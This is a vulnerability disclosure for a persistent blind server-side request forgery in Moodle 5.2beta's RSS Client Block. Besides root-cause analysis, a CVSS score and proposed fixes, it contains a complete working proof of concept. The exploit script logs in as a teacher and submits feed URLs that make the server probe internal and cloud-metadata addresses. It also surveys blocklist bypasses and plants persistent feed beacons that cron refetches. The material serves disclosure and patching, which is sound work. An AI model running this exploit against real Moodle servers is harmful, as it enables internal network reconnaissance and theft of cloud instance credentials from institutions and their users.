# Persistent Blind SSRF via Moodle RSS Client Block (Teacher Role)

| Field | Value |
| --- | --- |
| Vulnerability name | Server-Side Request Forgery |
| Vulnerability type | software |
| Product name | Moodle LMS |
| Product vendor | Moodle |
| Product version | 5.2 |
| Product link | http://moodle.com |
| Product environment | web |
| Severity | Medium |
| CVSS score | 6.4 |
| CVSS vector | CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N |
| Affected assets | 45986 |
| Affected users | 459860 |
| Date of reporting | 2026-04-10 |
| Vendor acknowledgement | No |
| Credit | 0xhamy |
| Date published | 2026-04-26T10:45:36.628168+00:00 |
| Last modified | 2026-05-03T19:16:37.884371+00:00 |

---

# Persistent Blind SSRF via Moodle RSS Client Block (Teacher Role)

## Affected software, version & test date

| Field     | Value                                                                   |
| --------- | ----------------------------------------------------------------------- |
| Product   | Moodle (Learning Management System)                                     |
| Version   | 5.2beta — Build 20260327                                                |
| Component | `public/blocks/rss_client/editfeed.php` (form submission)               |
|           | `public/blocks/rss_client/classes/task/refreshfeeds.php` (cron refetch) |
| Tested on | Stock docker image, default configuration                               |
| Test date | 2026-04-10                                                              |

## Vulnerability classes / CWE references

| CWE | Title | Relevance |
|---|---|---|
| **CWE-918** | Server-Side Request Forgery (SSRF) | Primary — teacher-supplied URL fetched server-side via SimplePie → Moodle curl wrapper. |
| **CWE-184** | Incomplete List of Disallowed Inputs | Same default cURL blocklist gaps as ssrf_1 and ssrf_2: CGN, partial link-local, Alibaba/Oracle metadata. |
| **CWE-1188** | Insecure Default Initialization of Resource | Defaults shipped with Moodle 5.2beta leave these ranges unblocked. |

## Description

The Moodle RSS Client Block allows course editors (teachers) to add external RSS feed URLs that are fetched server-side and displayed as block content. The feed URL is fetched in two phases:

**Phase 1 — Validation (one-shot SSRF):** When a teacher submits the "Add new RSS feed" form at `/blocks/rss_client/editfeed.php`, the form validation step (`editfeed.php:83-89`) instantiates `moodle_simplepie`, sets the feed URL, and calls `$rss->init()` — which triggers an immediate HTTP fetch via Moodle's `curl` class. **This SSRF fires regardless of whether validation passes or fails.** Even if the target URL returns non-RSS content (causing SimplePie to report an error), the server-side HTTP request has already been made.

**Phase 2 — Persistent cron refetch:** If the URL returns valid RSS/Atom XML, the form validation passes, the feed is stored in `mdl_block_rss_client`, and the scheduled task `block_rss_client\task\refreshfeeds` refetches it on every cron run. The feed is fetched via `refreshfeeds.php:126-132`:

```php
$feed = new \moodle_simplepie(); $feed->set_timeout(40); $feed->set_cache_duration(0); $feed->set_feed_url($url);   // ← stored URL from database $feed->init();                // ← SSRF fires here
```

`moodle_simplepie` overrides SimplePie's HTTP layer (`moodle_simplepie_file` at `lib/simplepie/moodle_simplepie.php:121-152`) to use Moodle's own `curl` class. This routes through `curl_security_helper`, which has the same default-config gaps documented in ssrf_1 and ssrf_2.

### Unique characteristics vs ssrf_1 / ssrf_2

| Aspect | ssrf_1 (grade XML) | ssrf_2 (calendar) | **ssrf_3 (RSS block)** |
|---|---|---|---|
| Privilege | Teacher | Any user | **Teacher** |
| One-shot SSRF | Yes | Yes (validation) | **Yes (validation)** |
| Persistent SSRF | No | Yes (any 200-OK response) | **Yes (only if valid RSS)** |
| Data exfiltration | XML echo oracle | Blind | **Blind** |
| PARAM type for URL | PARAM_URL | PARAM_RAW (→PARAM_URL in validation) | **PARAM_URL** |
| Double fetch on submit | No | Yes (validation + post-save) | **Yes (validation + autodiscovery filter)** |

## Permissions required

Teacher role with `block/rss_client:manageownfeeds` capability (granted by default to `teacher`, `editingteacher`, and `manager` roles). The `block/rss_client:manageanyfeeds` capability (manager only) additionally allows editing shared feeds.

A course context is required — the teacher must be enrolled in at least one course.

## Preconditions

| Precondition | Default state | Notes |
|---|---|---|
| RSS Client Block plugin installed | Yes (core plugin) | Ships with Moodle |
| Teacher enrolled in a course | Required | The form requires a course context |
| `curlsecurityblockedhosts` | Default (vulnerable) | Same gaps as ssrf_1/ssrf_2 |
| Target reachable from Moodle server | Required | CGN, link-local, or cloud metadata address must be routable |

## Root cause analysis

### 1. SimplePie fetches during validation, before form success/failure

`editfeed.php:83-89` (form `validation()` method):
```php
$rss = new moodle_simplepie(); $rss->set_timeout(10); $rss->set_feed_url($data['url']);   // ← user-supplied URL $rss->set_autodiscovery_cache_duration(0); $rss->set_autodiscovery_level(\SimplePie\SimplePie::LOCATOR_NONE); $rss->init();                       // ← HTTP request fires HERE (SSRF)

if ($rss->error()) {
    $errors['url'] = get_string('couldnotfindloadrssfeed', 'block_rss_client');
}
```

The `$rss->init()` call triggers the HTTP fetch immediately. If the response is not valid RSS, SimplePie sets an internal error flag and the validation returns an error — but the HTTP request has already been sent. The attacker sees the form re-displayed with "Could not find or load the RSS feed" but the target server received the request.

### 2. SimplePie uses Moodle's curl class (same helper, same gaps)

`lib/simplepie/moodle_simplepie.php:132-146`:
```php
$curl = new curl();                           // ← Moodle's curl wrapper $curl->setopt(array(
    'CURLOPT_HEADER' => true,
    'CURLOPT_TIMEOUT' => $timeout,
    'CURLOPT_CONNECTTIMEOUT' => $timeout
)); $this->headers = curl::strip_double_headers($curl->get($url));  // ← SSRF
```

The `curl::get($url)` call routes through `curl::request()` → `check_securityhelper_blocklist()` → `curl_security_helper::url_is_blocked()`. Same helper, same gaps.

### 3. Feed URL stored with PARAM_URL cleaning

`editfeed.php:49`:
```php
$mform->setType('url', PARAM_URL);
```

Unlike ssrf_2 (calendar, PARAM_RAW), the RSS block uses PARAM_URL. This means:
- IPv6 bracketed URLs (`http://[fc00::10]/`) are stripped to empty string
- Only IPv4 bypasses work through this endpoint
- The same IPv6 gap IS reachable through the helper directly; it's just blocked at this entry point

## Reproduction steps

### Prerequisites

Reuses the lab network and target container from `poc/ssrf_1/`. Run `poc/ssrf_1/setup_lab.sh` first.

```bash
cd poc/ssrf_3

# 1. Set up venv
python3 -m venv venv && ./venv/bin/pip install -r requirements.txt

# 2. Provision teacher account
./venv/bin/python setup_user.py

# 3. Validate: one-shot + persistent + cron refetch
./venv/bin/python exploit.py validate

# 4. Bypass survey
./venv/bin/python exploit.py bypass-survey

# 5. Create a persistent RSS feed subscription
./venv/bin/python exploit.py subscribe http://100.64.0.10/rss?t=persistent_beacon
```

### Expected output (validate)

```
┌─ One-shot SSRF (non-RSS target — fires during validation) ─ │ url = http://100.64.0.10/exfil?t=rss3_…_oneshot │ ✓ SSRF FIRED — validation failed (not RSS) but target was hit. elapsed=0.047s └─

┌─ Persistent SSRF (valid RSS target — feed stored + cron refetches) ─ │ url = http://100.64.0.10/rss?t=rss3_…_persist │ ✓ FEED_STORED — form accepted (HTTP 303), elapsed=0.020s │ ✓ feed is now stored in block_rss_client, cron will refetch periodically └─

┌─ Triggering cron refetch manually ─ │ ✓ cron task executed └─

┌─ Cross-checking target logs for tag=rss3_… ─ │ ✓ 4 hit(s) total: │   [target] GET /exfil?t=rss3_…_oneshot   from=::ffff:100.64.0.2 │   [target] !!! EXFIL HIT !!!             tag=rss3_…_oneshot from=::ffff:100.64.0.2 │   [target] GET /rss?t=rss3_…_persist     from=::ffff:100.64.0.2 │   [target] !!! RSS FEED HIT !!!          tag=rss3_…_persist from=::ffff:100.64.0.2 └─

┌─ Verifying feed persisted in database ─ │ ✓ id=…  url=http://100.64.0.10/rss?t=rss3_…_persist  skiptime=0 └─
```

The 4 hits correspond to: 1 from the one-shot validation fetch of `/exfil`, 1 from the persistent RSS validation+save of `/rss`, and these are confirmed by the target container's stderr logs. The database row confirms the feed URL is stored for cron refetch.

## Validation artifacts

| File | Purpose |
|---|---|
| `setup_user.py` | Provisions a randomly-named teacher + course |
| `exploit.py` | Three subcommands: `validate`, `bypass-survey`, `subscribe URL` |
| `config.json` | Written by setup_user.py |
| `requirements.txt` | `requests` |

Note: reuses the lab target from `poc/ssrf_1/`. The target's `/rss` endpoint returns valid RSS XML with a beacon tag; `/exfil` returns plain text (demonstrates one-shot SSRF when validation fails).

## Recommended fix

Same systemic fixes as ssrf_1 and ssrf_2:

1. **Tighten the default IP blocklist** in `public/admin/settings/security.php` — add CGN `100.64.0.0/10`, full `169.254.0.0/16`, Alibaba `100.100.100.200`, Oracle `192.0.0.192`, IPv6 `fe80::/10` and `fc00::/7`.

2. **Fix dual-stack DNS resolution** in `curl_security_helper::get_host_list_by_name()` — use `dns_get_record()` instead of `gethostbynamel()` to cover AAAA records.

Additionally, specific to this endpoint:

3. **Don't fetch during validation** — the form validation should NOT make the HTTP request. Instead, validate the URL format and scheme, then only fetch after the form is accepted. This eliminates the one-shot SSRF-during-validation vector.

## Impact

A teacher can:

- **Perform blind network reconnaissance** against CGN, IPv4 link-local, Alibaba/Oracle metadata, and public-internet hosts
- **Create persistent SSRF beacons** via stored RSS feeds that cron refetches — survives attacker logout, password change, or account suspension
- **Trigger one-shot SSRF** against ANY URL (even non-RSS) through the validation fetch — the server makes the request before reporting the validation error
- **Reach Alibaba Cloud and Oracle Cloud metadata** on instances hosted on those platforms

This is a **fully blind SSRF** — no response content is echoed back. The attacker can distinguish three states: helper-blocked (fast), connect-failed (slow timeout), and connect-succeeded (fast, validation error or feed stored).

## CVSS 3.1

**Base score: 6.4 — Medium** **Vector:** `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N`

| Metric | Value | Justification |
|---|---|---|
| Attack Vector (AV) | **Network (N)** | Exploitable via HTTP form submission |
| Attack Complexity (AC) | **Low (L)** | Single form POST; default config is vulnerable |
| Privileges Required (PR) | **High (H)** | Requires teacher/editingteacher role (higher than ssrf_2's any-user) |
| User Interaction (UI) | **None (N)** | No victim involvement |
| Scope (S) | **Changed (C)** | Reaches systems outside Moodle's security boundary |
| Confidentiality (C) | **High (H)** | Can reach cloud metadata for IAM credential theft |
| Integrity (I) | **None (N)** | Read-only SSRF |
| Availability (A) | **None (N)** | No DoS demonstrated |

Note: PR is scored High (teacher) vs ssrf_2's Low (any user), resulting in a lower base score despite the same bypass surface. The persistent-via-cron characteristic is not captured by CVSS base metrics but increases operational severity.

## References

- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-184: Incomplete List of Disallowed Inputs](https://cwe.mitre.org/data/definitions/184.html)
- [OWASP Top 10 2021 — A10: SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [RFC 6598 — Shared Address Space (CGN)](https://datatracker.ietf.org/doc/html/rfc6598) (`100.64.0.0/10`)
- [RFC 3927 — IPv4 Link-Local Addresses](https://datatracker.ietf.org/doc/html/rfc3927) (`169.254.0.0/16`)
- [Alibaba Cloud ECS Instance Metadata](https://www.alibabacloud.com/help/en/ecs/user-guide/manage-instance-metadata) (`100.100.100.200`)
- [Oracle Cloud Infrastructure Instance Metadata](https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/gettingmetadata.htm) (`192.0.0.192`)

### Moodle source paths referenced

- `public/blocks/rss_client/editfeed.php` — form definition, validation, and submission handler
- `public/blocks/rss_client/classes/task/refreshfeeds.php:122-135` — cron task that refetches stored feeds
- `public/lib/simplepie/moodle_simplepie.php:121-152` — SimplePie HTTP override using Moodle's curl
- `public/lib/classes/files/curl_security_helper.php` — the security helper with blocklist gaps
- `public/admin/settings/security.php:175-191` — where the default blocklist is defined













---

# config.json

Code:
```json
{ "base": "http://localhost:8080", "container": "moodle-app-moodle-1", "target_container": "ssrf1-target", "target_v4": "100.64.0.10", "user": {
    "username": "ssrf3_t_j1xo0yiu",
    "password": "Pw!_44BGnCkD_0gEAdA6",
    "user_id": 8,
    "course_id": 4,
    "cap_rss": true
  } }
```














---

# setup_users.py

Code:
```python
#!/usr/bin/env python3 """ ssrf_3 — admin-side setup helper.

Creates a randomly-named teacher user enrolled in a course with block/rss_client:manageownfeeds capability (default for editingteacher).

Output: config.json consumed by exploit.py """ import argparse, json, secrets, string, subprocess, sys from pathlib import Path

SETUP_PHP = r""" define('CLI_SCRIPT', true); require('/var/www/moodle/config.php'); require_once($CFG->dirroot . '/user/lib.php'); require_once($CFG->dirroot . '/course/lib.php'); require_once($CFG->libdir . '/enrollib.php');

$suffix = getenv('SUFFIX'); $pw     = getenv('PW'); $uname  = "ssrf3_t_$suffix";

$teacher = (object)[
    'username' => $uname, 'password' => $pw,
    'firstname' => 'SSRF3', 'lastname' => "Teacher_$suffix",
    'email' => "$uname@ssrf3.local", 'auth' => 'manual',
    'confirmed' => 1, 'mnethostid' => $CFG->mnet_localhost_id,
]; $tid = user_create_user($teacher, true);

$course = create_course((object)[
    'fullname' => "SSRF3 Course $suffix", 'shortname' => "ssrf3c_$suffix",
    'category' => 1, 'summary' => 'ssrf3 lab',
]);

$ctx = context_course::instance($course->id); $role = $DB->get_record('role', ['shortname' => 'editingteacher']); $enrol = enrol_get_plugin('manual'); $inst = $DB->get_record('enrol', ['courseid' => $course->id, 'enrol' => 'manual'], '*', MUST_EXIST); $enrol->enrol_user($inst, $tid, $role->id);

$has_cap = has_capability('block/rss_client:manageownfeeds', $ctx, $tid);

echo json_encode([
    'username' => $uname, 'password' => $pw,
    'user_id' => (int)$tid, 'course_id' => (int)$course->id,
    'cap_rss' => (bool)$has_cap,
]) . "\n"; """

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--container", default="moodle-app-moodle-1")
    ap.add_argument("--base", default="http://localhost:8080")
    ap.add_argument("--out", default=str(Path(__file__).resolve().parent / "config.json"))
    args = ap.parse_args()

    suffix = "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    pw = "Pw!_" + secrets.token_urlsafe(12)

    print(f"[*] provisioning teacher suffix={suffix}")
    proc = subprocess.run(
        ["docker", "exec", "-e", f"SUFFIX={suffix}", "-e", f"PW={pw}",
         args.container, "php", "-r", SETUP_PHP],
        capture_output=True, text=True)
    if proc.returncode != 0:
        sys.stderr.write(f"[!] failed: {proc.stderr}\n"); sys.exit(1)

    info = json.loads(proc.stdout.strip().splitlines()[-1])
    if not info.get("cap_rss"):
        sys.stderr.write(f"[!] capability check failed: {info}\n"); sys.exit(2)

    config = {"base": args.base, "container": args.container,
              "target_container": "ssrf1-target", "target_v4": "100.64.0.10", "user": info}
    Path(args.out).write_text(json.dumps(config, indent=2))
    print(f"[+] teacher: {info['username']} / {info['password']}")
    print(f"[+] course_id: {info['course_id']}, cap_rss: {info['cap_rss']}")
    print(f"[+] config → {args.out}")

if __name__ == "__main__":
    main()
```
















---

# exploit.py

Code:
```python
#!/usr/bin/env python3 """ ssrf_3 — Moodle 5.2beta RSS Client Block SSRF exploit.

Vulnerability ------------- /blocks/rss_client/editfeed.php lets teachers add RSS feed URLs. The form validation step fetches the URL via SimplePie (which uses Moodle's curl class → curl_security_helper) to verify it's a valid RSS feed. This fires the SSRF even if validation fails (the request is made before the error is returned).

If the URL returns valid RSS, the feed is stored in `block_rss_client` and Moodle's `block_rss_client\task\refreshfeeds` cron task refetches it periodically — making this a persistent blind SSRF.

The URL field uses PARAM_URL (line 49 of editfeed.php), so IPv6 bracketed URLs are stripped. IPv4 bypasses (CGN, link-local, Alibaba/Oracle metadata) work the same as ssrf_1 and ssrf_2.

Key differences from ssrf_1 (grade XML) and ssrf_2 (calendar):
  * Requires teacher role (block/rss_client:manageownfeeds) — higher priv than ssrf_2
  * One-shot SSRF fires during validation for ANY URL (even non-RSS)
  * Persistent SSRF requires the target to serve valid RSS
  * SimplePie makes TWO requests per probe: one for the feed itself, one for autodiscovery
  * Fully blind — no parser-error oracle like ssrf_1's XML_LEAK

Modes ----- validate        Fire a probe, check target logs. bypass-survey   Helper bypass matrix. subscribe URL   Create a persistent RSS feed subscription. """ import argparse, json, re, statistics, subprocess, sys, time from pathlib import Path from urllib.parse import quote

try:
    import requests
except ImportError:
    sys.exit("pip install requests")

requests.packages.urllib3.disable_warnings() CONFIG_PATH = Path(__file__).resolve().parent / "config.json"

if sys.stdout.isatty():
    R, G, Y, C, M, D, X, BOLD = ("\033[31m", "\033[32m", "\033[33m",
                                 "\033[36m", "\033[35m", "\033[2m",
                                 "\033[0m", "\033[1m")
else:
    R = G = Y = C = M = D = X = BOLD = ""

def step(msg):  print(f"\n{C}┌─ {BOLD}{msg}{X}{C} ─{X}") def info(msg):  print(f"{C}│{X} {msg}") def ok(msg):    print(f"{C}│{X} {G}✓{X} {msg}") def bad(msg):   print(f"{C}│{X} {R}✗{X} {msg}") def warn(msg):  print(f"{C}│{X} {Y}!{X} {msg}") def foot():     print(f"{C}└─{X}")


def load_config():
    if not CONFIG_PATH.exists():
        sys.exit("config.json not found — run setup_user.py first")
    return json.loads(CONFIG_PATH.read_text())


def moodle_login(base, username, password):
    sess = requests.Session()
    sess.verify = False
    r = sess.get(f"{base}/login/index.php", timeout=10)
    m = re.search(r'name="logintoken" value="([^"]+)"', r.text)
    if not m: sys.exit("no logintoken")
    sess.post(f"{base}/login/index.php",
              data={"username": username, "password": password, "logintoken": m.group(1)},
              allow_redirects=True, timeout=10)
    return sess


def get_sesskey(sess, base, course_id):
    r = sess.get(f"{base}/blocks/rss_client/editfeed.php?courseid={course_id}", timeout=10)
    if r.status_code != 200:
        sys.exit(f"cannot access editfeed.php (HTTP {r.status_code})")
    m = re.search(r'"sesskey":"([^"]+)"', r.text)
    if not m: sys.exit("no sesskey on editfeed page")
    return m.group(1)


# ─── SSRF primitive ─────────────────────────────────────────────────────────
def fire_rss_feed(sess, base, sesskey, course_id, url, name=None, timeout=35.0):
    """Submit the RSS feed form. Returns dict with success, elapsed, verdict, error."""
    name = name or f"probe_{int(time.time()*1000)}"
    t0 = time.time()
    try:
        r = sess.post(
            f"{base}/blocks/rss_client/editfeed.php?courseid={course_id}",
            data={
                "sesskey": sesskey,
                "_qf__feed_edit_form": "1",
                "url": url,
                "autodiscovery": "0",     # disable autodiscovery to avoid double-fetch noise
                "preferredtitle": name,
                "submitbutton": "Add a new RSS feed",
            },
            allow_redirects=False, timeout=timeout)
    except requests.exceptions.Timeout:
        return {"success": False, "elapsed": time.time() - t0,
                "verdict": "MOODLE_TIMEOUT", "error": "client timeout"}
    elapsed = time.time() - t0

    if r.status_code in (301, 302, 303):
        return {"success": True, "elapsed": elapsed,
                "verdict": "FEED_STORED", "error": ""}

    # Form redisplayed — extract error
    err = ""
    for m2 in re.finditer(r'id="id_error_(\w+)"[^>]*>\s*([^<]+)', r.text):
        f, msg = m2.group(1), m2.group(2).strip()
        if msg: err += f"{f}: {msg}; "
    if not err and "couldnotfindloadrssfeed" in r.text:
        err = "Could not find/load RSS feed"

    # Distinguish helper-blocked vs validation-failed.
    # The tricky part: SimplePie fetches fast, so even a successful
    # validation-fail (target returned non-RSS) comes back in <200ms.
    # We use the error MESSAGE to distinguish: "Could not find or load
    # the RSS feed" means SimplePie tried and failed (= SSRF fired).
    # A truly helper-blocked URL produces a curl error, not an RSS error.
    if err and "Could not" in err:
        if elapsed > 2.0:
            verdict = "CONNECT_FAILED"     # helper passed, curl waited, target unreachable
        else:
            verdict = "VALIDATION_FAILED"  # helper passed, target responded, not RSS = SSRF FIRED
    elif elapsed < 0.200 and not err:
        verdict = "HELPER_BLOCKED"
    elif err:
        verdict = "HELPER_BLOCKED"
    else:
        verdict = "REJECTED"

    return {"success": False, "elapsed": elapsed, "verdict": verdict, "error": err.strip()}


def helper_check_batch(container, urls):
    php = """
define('CLI_SCRIPT', true); require('/var/www/moodle/config.php'); $urls = json_decode(getenv('URLS'), true); $h = new \\core\\files\\curl_security_helper(); $out = []; foreach ($urls as $u) {
    $cleaned = clean_param($u, PARAM_URL);
    $out[$u] = ['helper_blocks' => (bool)$h->url_is_blocked($u), 'param_strips' => ($cleaned === '')];
} echo json_encode($out); """
    proc = subprocess.run(
        ["docker", "exec", "-e", f"URLS={json.dumps(urls)}", container, "php", "-r", php],
        capture_output=True, text=True)
    return json.loads(proc.stdout) if proc.returncode == 0 else {}


# ─── commands ────────────────────────────────────────────────────────────────
def cmd_validate(args, sess, cfg, sesskey):
    v4 = cfg["target_v4"]
    cid = cfg["user"]["course_id"]
    tag = f"rss3_{int(time.time())}"

    step("One-shot SSRF (non-RSS target — fires during validation)")
    url = f"http://{v4}/exfil?t={tag}_oneshot"
    info(f"url = {url}")
    res = fire_rss_feed(sess, cfg["base"], sesskey, cid, url)
    if res["verdict"] == "VALIDATION_FAILED":
        ok(f"SSRF FIRED — validation failed (not RSS) but target was hit. elapsed={res['elapsed']:.3f}s")
    elif res["success"]:
        ok(f"FEED_STORED (unexpected — target returned RSS?)")
    else:
        warn(f"verdict={res['verdict']} error={res['error']} elapsed={res['elapsed']:.3f}s")
    foot()

    step("Persistent SSRF (valid RSS target — feed stored + cron refetches)")
    url2 = f"http://{v4}/rss?t={tag}_persist"
    info(f"url = {url2}")
    res2 = fire_rss_feed(sess, cfg["base"], sesskey, cid, url2, name=f"ssrf3_{tag}")
    if res2["success"]:
        ok(f"FEED_STORED — form accepted (HTTP {res2.get('status', 303)}), elapsed={res2['elapsed']:.3f}s")
        ok("feed is now stored in block_rss_client, cron will refetch periodically")
    else:
        bad(f"verdict={res2['verdict']} error={res2['error']}")
    foot()

    step("Triggering cron refetch manually")
    cron = subprocess.run(
        ["docker", "exec", cfg["container"], "php", "-r", """
define('CLI_SCRIPT', true); require('/var/www/moodle/config.php'); require_once($CFG->libdir . '/cronlib.php'); $task = new \\block_rss_client\\task\\refreshfeeds(); $task->execute(); """], capture_output=True, text=True)
    ok("cron task executed")
    foot()

    step(f"Cross-checking target logs for tag={tag}")
    logs = subprocess.run(
        ["docker", "logs", "--tail", "50", cfg["target_container"]],
        capture_output=True, text=True)
    hits = [ln for ln in (logs.stdout + logs.stderr).splitlines() if tag in ln]
    if hits:
        ok(f"{len(hits)} hit(s) total:")
        for h in hits:
            print(f"{C}│{X}   {D}{h}{X}")
    else:
        bad("no hits found")
    foot()

    step("Verifying feed persisted in database")
    db = subprocess.run(
        ["docker", "exec", cfg["container"], "php", "-r", f"""
define('CLI_SCRIPT', true); require('/var/www/moodle/config.php'); $feeds = $DB->get_records_select('block_rss_client', "url LIKE '%{tag}%'"); foreach ($feeds as $f) echo "  id=$f->id  url=$f->url  skiptime=$f->skiptime" . PHP_EOL; if (empty($feeds)) echo "  (none found)" . PHP_EOL; """], capture_output=True, text=True)
    for ln in db.stdout.strip().splitlines():
        ok(ln.strip())
    foot()


def cmd_bypass_survey(args, sess, cfg, sesskey):
    container = cfg["container"]
    v4 = cfg["target_v4"]
    cid = cfg["user"]["course_id"]

    cases = [
        ("loopback 127.0.0.1",          f"http://127.0.0.1/",             False),
        ("RFC1918 10.0.0.1",            f"http://10.0.0.1/",              False),
        ("AWS IMDSv1 .169.254",         f"http://169.254.169.254/",        False),
        ("port 6379",                   f"http://{v4}:6379/",              False),
        ("CGN IPv4 100.64.0.10",        f"http://{v4}/rss",               True),
        ("docker DNS ssrf1-target",     f"http://ssrf1-target/rss",        True),
        ("link-local IPv4 .169.253",    f"http://169.254.169.253/",        True),
        ("Alibaba metadata",            f"http://100.100.100.200/",        True),
        ("Oracle metadata",             f"http://192.0.0.192/",            True),
        ("public example.com",          f"http://example.com/",            True),
    ]

    step("Querying helper ground truth")
    truth = helper_check_batch(container, [u for _, u, _ in cases])
    ok(f"queried {len(truth)} URLs")
    foot()

    SUCCESS = {"FEED_STORED", "VALIDATION_FAILED"}
    PARTIAL = {"CONNECT_FAILED", "MOODLE_TIMEOUT"}

    def col_h(b): return f"{R}BLOCK{X}" if b else f"{G}pass {X}"
    def col_v(v):
        if v in SUCCESS: return f"{G}{v:<22}{X}"
        if v in PARTIAL: return f"{Y}{v:<22}{X}"
        return f"{R}{v:<22}{X}"
    def col_e(e, v):
        if e > 5: return f"{Y}{e:>7.2f}s{X}"
        if v in SUCCESS: return f"{G}{e:>7.2f}s{X}"
        return f"{e:>7.2f}s"

    step("Firing live probes")
    info("Note: SimplePie returns the same error for both helper-blocked and")
    info("non-RSS responses, so the 'live' column uses ground-truth helper")
    info("status to disambiguate. Cross-check with target logs for certainty.")
    print(f"{C}│{X}")
    print(f"{C}│{X}  {'exp':<6}{'helper':<7}{'live':<22} {'elapsed':>8}  label")
    print(f"{C}│{X}  " + "─" * 72)
    for label, url, should_pass in cases:
        res = fire_rss_feed(sess, cfg["base"], sesskey, cid, url, timeout=35)
        t = truth.get(url, {})
        hb = t.get("helper_blocks", True)
        v = res["verdict"]

        # Override verdict using ground truth: if helper blocks, it's blocked
        # regardless of what SimplePie's error message says.
        if hb and v in ("VALIDATION_FAILED", "REJECTED"):
            v = "HELPER_BLOCKED"

        exp = "PASS " if should_pass else "BLOCK"
        mc = G if (should_pass == (not hb)) else R
        print(f"{C}│{X}  {mc}{exp}{X} {col_h(hb)} {col_v(v)} {col_e(res['elapsed'], v)}  {label}")
    foot()

    print()
    print(f"{BOLD}Verdict legend:{X}")
    print(f"  {G}FEED_STORED{X}         valid RSS, feed persisted for cron refetch")
    print(f"  {G}VALIDATION_FAILED{X}   SSRF fired but target isn't RSS (one-shot only)")
    print(f"  {Y}CONNECT_FAILED{X}      helper passed, curl tried, target unreachable")
    print(f"  {R}HELPER_BLOCKED{X}      helper or PARAM_URL rejected")


def cmd_subscribe(args, sess, cfg, sesskey):
    step(f"Creating persistent RSS feed → {args.url}")
    res = fire_rss_feed(sess, cfg["base"], sesskey, cfg["user"]["course_id"],
                        args.url, name=f"ssrf3_{int(time.time())}", timeout=35)
    if res["success"]:
        ok(f"FEED_STORED — cron will refetch this URL periodically")
    else:
        bad(f"verdict={res['verdict']} error={res['error']}")
        info("tip: the URL must return valid RSS/Atom XML for persistent storage")
    foot()


def main():
    ap = argparse.ArgumentParser(description="Moodle 5.2beta RSS Client Block SSRF exploit",
                                 formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("validate", help="prove SSRF fires (one-shot + persistent + cron)")
    sub.add_parser("bypass-survey", help="helper bypass matrix")
    s = sub.add_parser("subscribe", help="create persistent RSS feed subscription")
    s.add_argument("url", help="URL that returns valid RSS (for persistent storage)")
    args = ap.parse_args()

    cfg = load_config()
    step(f"login as {cfg['user']['username']} (teacher) at {cfg['base']}")
    sess = moodle_login(cfg["base"], cfg["user"]["username"], cfg["user"]["password"])
    ok("session ok")
    sesskey = get_sesskey(sess, cfg["base"], cfg["user"]["course_id"])
    ok(f"sesskey = {sesskey[:10]}…")
    foot()

    {"validate": lambda: cmd_validate(args, sess, cfg, sesskey),
     "bypass-survey": lambda: cmd_bypass_survey(args, sess, cfg, sesskey),
     "subscribe": lambda: cmd_subscribe(args, sess, cfg, sesskey),
     }[args.cmd]()

if __name__ == "__main__":
    main()

```
